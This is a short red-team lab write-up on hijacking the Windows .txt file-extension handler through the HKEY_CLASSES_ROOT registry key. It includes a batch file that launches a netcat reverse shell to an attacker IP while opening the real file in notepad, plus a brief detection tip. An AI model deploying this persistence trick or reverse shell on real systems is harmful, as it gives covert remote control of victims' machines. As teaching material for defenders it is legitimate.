# Hijacking Default File Extension

## Hijacking Default File Extension

When a .txt file is double clicked, it's opened with a notepad.exe. Windows knows that it needs to use notepad.exe for opening txt files, because the `.txt` extension (among many others) are mapped to applictions that can open those files in Windows registry located at `Computer\HKEY_CLASSES_ROOT`.

It's possible to hijack a file extension and make it execute a malicious application before the actual file is opened.

In this quick lab, I'm going to hijack the .txt extension - the victim user will still be able to open the original .txt file, but it will additionally fire a reverse shell back to the attacking system.

### Execution

The .txt extension handler is defined in the below registry key:

```erlang
Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command
```

Below shows that the command responsible for opening .txt files is `notepad.exe %1`, where `%1` is the argument for notepad.exe, which specifies a file name the notepad should open:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LytRvmbGKgE7_9TknNn%2F-LytV7_GxCTWIUCfS9FF%2Fimage.png?alt=media\&token=56074457-5956-4be7-838d-1055fb10981b)

Say, a target user has the file test.exe on his desktop with the below file contents:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LytRvmbGKgE7_9TknNn%2F-LytVYE64Snj6XQKsnUc%2Fimage.png?alt=media\&token=107571e7-006f-46f0-b659-e0f202993a48)

Let's now create a malicious file that we want to be executed when the user attempts to open the benign file test.txt. For this lab, the malicious file is going to be a simple Windows batch file located in c:\tools\shell.cmd:

{% code title="c:\tools\shell.cmd" %}
```erlang
start C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
start notepad.exe %1
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LytRvmbGKgE7_9TknNn%2F-LytVIfM2k2ma3uwvYVt%2Fimage.png?alt=media\&token=56127126-ea8d-4eb1-aff6-97ec768f9994)

Once executed, `c:\tools\hell.cmd` will launch a simple netcat reverse shell to the attacking system and also a notepad with the `test.txt` file as an argument.

We are now ready to hijack the .txt file extension by modifying the value data of `Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command` to `c:\tools\shell.cmd %1` as shown below:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LytRvmbGKgE7_9TknNn%2F-LytZUk6xHrAvnnq4yjd%2Fimage.png?alt=media\&token=76c2ca06-394a-483c-a0a3-12c0f99d5a52)

### Demo

Opening the test.txt file by double clikcing it opens the file itself, but a reverse shell is thrown to the attacking system as well:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LytRvmbGKgE7_9TknNn%2F-LytVpLIPHxCDULv25e4%2Fhijacked-extension.gif?alt=media\&token=67f1060d-88e7-4a18-8e1e-4e4b30207887)

### Detection

Defenders may want to monitor registry for file extension command changes, especially if the data field contains binaries located in unusual places.

### References

{% embed url="https://attack.mitre.org/techniques/T1042/" %}
